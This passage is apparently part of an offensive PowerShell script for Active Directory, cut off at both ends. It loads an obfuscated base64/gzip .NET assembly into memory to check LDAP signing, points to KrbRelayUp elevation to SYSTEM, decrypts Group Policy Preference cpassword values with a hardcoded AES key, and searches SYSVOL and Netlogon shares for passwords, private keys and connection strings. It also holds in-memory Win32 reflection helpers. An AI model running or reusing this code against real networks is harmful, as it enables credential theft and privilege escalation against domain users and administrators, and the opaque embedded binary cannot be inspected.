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"))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)

    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [LdapSignCheck.Program]::main($Command.Split(" "))

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
  
}

if ($jldap)
{
    Write-Host "Skipping LDAP Signing Enumeration..." -ForegroundColor Yellow;
}
else{
    echo ""
	Write-Host "Enumerating LDAP Signing... " -ForegroundColor Cyan;
    Write-Host "If set to not-required you can elevate to SYSTEM via KrbRelayUp exploit!" -ForegroundColor Yellow;
    Outvoke-LdapSignCheck -Command "" > .\LDAPS.txt
    type .\LDAPS.txt
    Write-Host "Done! " -ForegroundColor Green;
    echo " "
}

function Get-GPPPassword {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingWMICmdlet', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SearchForest
    )


    function Get-DecryptedCpassword {
        [CmdletBinding()]
        Param (
            [string] $Cpassword
        )

        try {

            $Mod = ($Cpassword.length % 4)

            switch ($Mod) {
                '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                '2' {$Cpassword += ('=' * (4 - $Mod))}
                '3' {$Cpassword += ('=' * (4 - $Mod))}
            }

            $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            

            [System.Reflection.Assembly]::LoadWithPartialName("System.Core") |Out-Null


            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)


            $AesIV = New-Object Byte[]($AesObject.IV.Length)
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor()
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)

            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        }

        catch { Write-Error $Error[0] }
    }


    function Get-GPPInnerField {
    [CmdletBinding()]
        Param (
            $File
        )

        try {
            $Filename = Split-Path $File -Leaf
            [xml] $Xml = Get-Content ($File)


            if ($Xml.innerxml -match 'cpassword') {

                $Xml.GetElementsByTagName('Properties') | ForEach-Object {
                    if ($_.cpassword) {
                        $Cpassword = $_.cpassword
                        if ($Cpassword -and ($Cpassword -ne '')) {
                           $DecryptedPassword = Get-DecryptedCpassword $Cpassword
                           $Password = $DecryptedPassword
                           Write-Verbose "[Get-GPPInnerField] Decrypted password in '$File'"
                        }

                        if ($_.newName) {
                            $NewName = $_.newName
                        }

                        if ($_.userName) {
                            $UserName = $_.userName
                        }
                        elseif ($_.accountName) {
                            $UserName = $_.accountName
                        }
                        elseif ($_.runAs) {
                            $UserName = $_.runAs
                        }

                        try {
                            $Changed = $_.ParentNode.changed
                        }
                        catch {
                            Write-Verbose "[Get-GPPInnerField] Unable to retrieve ParentNode.changed for '$File'"
                        }

                        try {
                            $NodeName = $_.ParentNode.ParentNode.LocalName
                        }
                        catch {
                            Write-Verbose "[Get-GPPInnerField] Unable to retrieve ParentNode.ParentNode.LocalName for '$File'"
                        }

                        if (!($Password)) {$Password = '[BLANK]'}
                        if (!($UserName)) {$UserName = '[BLANK]'}
                        if (!($Changed)) {$Changed = '[BLANK]'}
                        if (!($NewName)) {$NewName = '[BLANK]'}

                        $GPPPassword = New-Object PSObject
                        $GPPPassword | Add-Member Noteproperty 'UserName' $UserName
                        $GPPPassword | Add-Member Noteproperty 'NewName' $NewName
                        $GPPPassword | Add-Member Noteproperty 'Password' $Password
                        $GPPPassword | Add-Member Noteproperty 'Changed' $Changed
                        $GPPPassword | Add-Member Noteproperty 'File' $File
                        $GPPPassword | Add-Member Noteproperty 'NodeName' $NodeName
                        $GPPPassword | Add-Member Noteproperty 'Cpassword' $Cpassword
                        $GPPPassword
                    }
                }
            }
        }
        catch {
            Write-Warning "[Get-GPPInnerField] Error parsing file '$File' : $_"
        }
    }


    function Get-DomainTrust {
        [CmdletBinding()]
        Param (
            $Domain
        )

        if (Test-Connection -Count 1 -Quiet -ComputerName $Domain) {
            try {
                $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
                $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
                if ($DomainObject) {
                    $DomainObject.GetAllTrustRelationships() | Select-Object -ExpandProperty TargetName
                }
            }
            catch {
                Write-Verbose "[Get-DomainTrust] Error contacting domain '$Domain' : $_"
            }

            try {
                $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Domain)
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
                if ($ForestObject) {
                    $ForestObject.GetAllTrustRelationships() | Select-Object -ExpandProperty TargetName
                }
            }
            catch {
                Write-Verbose "[Get-DomainTrust] Error contacting forest '$Domain' (domain may not be a forest object) : $_"
            }
        }
    }


    function Get-DomainTrustMapping {
        [CmdletBinding()]
        Param ()


        $SeenDomains = @{}


        $Domains = New-Object System.Collections.Stack

        try {
            $CurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Select-Object -ExpandProperty Name
            $CurrentDomain
        }
        catch {
            Write-Warning "[Get-DomainTrustMapping] Error enumerating current domain: $_"
        }

        if ($CurrentDomain -and $CurrentDomain -ne '') {
            $Domains.Push($CurrentDomain)

            while($Domains.Count -ne 0) {

                $Domain = $Domains.Pop()


                if ($Domain -and ($Domain.Trim() -ne '') -and (-not $SeenDomains.ContainsKey($Domain))) {

                    Write-Verbose "[Get-DomainTrustMapping] Enumerating trusts for domain: '$Domain'"


                    $Null = $SeenDomains.Add($Domain, '')

                    try {

                        Get-DomainTrust -Domain $Domain | Sort-Object -Unique | ForEach-Object {

                            if (-not $SeenDomains.ContainsKey($_) -and (Test-Connection -Count 1 -Quiet -ComputerName $_)) {
                                $Null = $Domains.Push($_)
                                $_
                            }
                        }
                    }
                    catch {
                        Write-Verbose "[Get-DomainTrustMapping] Error: $_"
                    }
                }
            }
        }
    }

    try {
        $XMLFiles = @()
        $Domains = @()

        $AllUsers = $Env:ALLUSERSPROFILE
        if (-not $AllUsers) {
            $AllUsers = 'C:\ProgramData'
        }


        Write-Verbose '[Get-GPPPassword] Searching local host for any cached GPP files'
        $XMLFiles += Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue

        if ($SearchForest) {
            Write-Verbose '[Get-GPPPassword] Searching for all reachable trusts'
            $Domains += Get-DomainTrustMapping
        }
        else {
            if ($Server) {
                $Domains += , $Server
            }
            else {

                $Domains += , [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Select-Object -ExpandProperty Name
            }
        }

        $Domains = $Domains | Where-Object {$_} | Sort-Object -Unique

        ForEach ($Domain in $Domains) {

            Write-Verbose "[Get-GPPPassword] Searching \\$Domain\SYSVOL\*\Policies. This could take a while."
            $DomainXMLFiles = Get-ChildItem -Force -Path "\\$Domain\SYSVOL\*\Policies" -Recurse -ErrorAction SilentlyContinue -Include @('Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml')

            if($DomainXMLFiles) {
                $XMLFiles += $DomainXMLFiles
            }
        }

        if ( -not $XMLFiles ) { throw '[Get-GPPPassword] No preference files found.' }

        Write-Verbose "[Get-GPPPassword] Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."

        ForEach ($File in $XMLFiles) {
            $Result = (Get-GppInnerField $File.Fullname)
            $Result
        }
    }

    catch { Write-Error $Error[0] }
}

if ($jgpo)
{
    Write-Host "Skipping passwords in GPO..." -ForegroundColor Yellow;
}
else{
    echo ""
	Write-Host "Search for passwords in GPO... " -ForegroundColor Cyan;
    Get-GPPPassword > GPP-Passwords.txt
    type GPP-Passwords.txt
    Write-Host "Done! " -ForegroundColor Green;
    echo " "
}

if ($jsysvol)
{
    Write-Host "Skipping passwords in SYSVOL/Netlogon..." -ForegroundColor Yellow;
}
else{
    echo ""
	Write-Host "Checking for password within SYSVOL/Netlogon... " -ForegroundColor Cyan;
    Write-Host "Output won't be shown on screen" -ForegroundColor Yellow;
    Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() } | Out-File -encoding ascii .\domain.txt -NoNewline
    Get-Content .\domain.txt | Foreach-Object{
       $currentADdomain = $_.Split('=')
       New-Variable -Name $currentADdomain[0] -Value $currentADdomain[1]
       }
    $SYSVOL_Path = "\\$currentADdomain\sysvol"
    $Netlogon_Path = "\\$currentADdomain\Netlogon"
    Get-ChildItem $SYSVOL_Path -Recurse -File -erroraction silentlycontinue | Select-String -Pattern "pass=", "pass =", "user=", "user =", "username=", "username =", "BEGIN PRIVATE KEY", "BEGIN RSA PRIVATE KEY", "password=", "password =", "creds", "credential", "secret", "key=", "connectionstring=", "connectionstring =" > .\SYSVOL.txt
    Get-ChildItem $Netlogon_Path -Recurse -File -erroraction silentlycontinue | Select-String -Pattern "pass=", "pass =", "user=", "user =", "username=", "username =", "BEGIN PRIVATE KEY", "BEGIN RSA PRIVATE KEY", "password=", "password =", "creds", "credential", "secret", "key =", "connectionstring=", "connectionstring =" > .\Netlogon.txt
    Write-Host "Done! " -ForegroundColor Green;
    echo " "
    del .\domain.txt
}

function New-InMemoryModule
{

    [OutputType([Reflection.Emit.ModuleBuilder])]
    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = [AppDomain]::CurrentDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}





function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $DllName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $FunctionName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory = $True)]
        [Reflection.Emit.ModuleBuilder]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {

        if (!$TypeHash.ContainsKey($DllName))
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
            }
            else
            {
                $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
            }
        }

        $Method = $TypeHash[$DllName].DefineMethod(
            $FunctionName,
            'Public,Static,PinvokeImpl',
            $ReturnType,
            $ParameterTypes)


        $i = 1
        foreach($Parameter in $ParameterTypes)
        {
            if ($Parameter.IsByRef)
            {
                [void] $Method.DefineParameter($i, 'Out', $null)
            }

            $i++
        }

        $DllImport = [Runtime.InteropServices.DllImportAttribute]
        $SetLastErrorField = $DllImport.GetField('SetLastError')
        $CallingConventionField = $DllImport.GetField('CallingConvention')
        $CharsetField = $DllImport.GetField('CharSet')
        if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }


        $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
        $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
            $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
            [Reflection.FieldInfo[]] @($SetLastErrorField, $CallingConventionField, $CharsetField),
            [Object[]] @($SLEValue, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))

        $Method.SetCustomAttribute($DllImportAttribute)
    }

    END
    {
        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()
            
            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}





function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $Position,
        
        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,
        
        [Parameter(Position = 2)]
        [UInt16]
        $Offset,
        
        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [Reflection.Emit.ModuleBuilder]
        $Module,

        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
